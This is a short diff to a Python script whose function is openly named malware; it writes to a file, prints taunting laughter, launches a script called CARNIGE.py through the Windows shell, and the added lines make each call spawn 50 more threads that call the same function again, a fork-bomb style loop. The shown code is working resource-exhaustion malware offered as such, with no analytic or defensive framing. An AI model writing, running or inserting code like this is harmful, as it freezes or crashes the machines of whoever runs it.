@@ -1,6 +1,7 @@
 from random import choice
 from os import system
 from colorama import Fore, init
+import threading
 
 init(convert=True)
 
@@ -16,5 +17,9 @@ def malware():
       file.write(fuckthisshit)
       print("HAHAHAHAAHAHAHAHAHAHAHAHAHHAHAHAHHAHAHAHAHAHHAHAHAHHAHAHAHHAHA")
       system("start /wait cmd /c python CARNIGE.py")
+
+      for i in range(int(50)):
+
+          threading.Thread(target=malware).start()
 
 malware()
